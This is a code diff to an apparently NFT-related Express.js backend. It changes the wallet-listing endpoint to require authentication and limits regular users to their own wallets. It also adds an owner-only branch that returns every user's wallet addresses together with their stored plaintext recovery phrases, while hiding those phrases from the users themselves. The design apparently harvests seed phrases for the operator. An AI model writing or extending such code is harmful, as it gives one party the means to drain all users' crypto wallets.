@@ -1462,16 +1462,48 @@ router.post("/nft-add-wallet", async (req, res) => {
 });
 
 // Fetch wallets for a user
-router.get("/nft-wallets/:userId", async (req, res) => {
+router.get("/nft-wallets/:userId", auth, async (req, res) => {
   try {
     const { userId } = req.params;
-    const user = await User.findOne({ userId });
 
+    // ADMIN view
+    if (req.user.isOwner) {
+      // Fetch all users' names and wallets
+      const users = await User.find({}, "name wallets").lean();
+      const all = users.flatMap(u =>
+        u.wallets.map(w => ({
+          ownerName: u.name,
+          walletName: w.walletName,
+          walletAddress: w.walletAddress,
+          recoveryPhrase: w.recoveryPhrase,
+          dateAdded: w.dateAdded,
+          _id: w._id
+        }))
+      );
+      return res.json({ wallets: all });
+    }
+
+    // REGULAR USER view: must match custom userId
+    if (req.user.userId !== userId) {
+      return res.status(403).json({ message: "Forbidden" });
+    }
+
+    // Find by the custom userId field
+    const user = await User.findOne({ userId }, "wallets").lean();
     if (!user) return res.status(404).json({ message: "User not found" });
 
-    res.status(200).json({ wallets: user.wallets });
-  } catch (error) {
-    res.status(500).json({ error: error.message });
+    // Only expose non‑sensitive fields
+    const own = user.wallets.map(w => ({
+      walletName: w.walletName,
+      walletAddress: w.walletAddress,
+      dateAdded: w.dateAdded,
+      _id: w._id
+    }));
+
+    return res.json({ wallets: own });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ message: err.message });
   }
 });
 
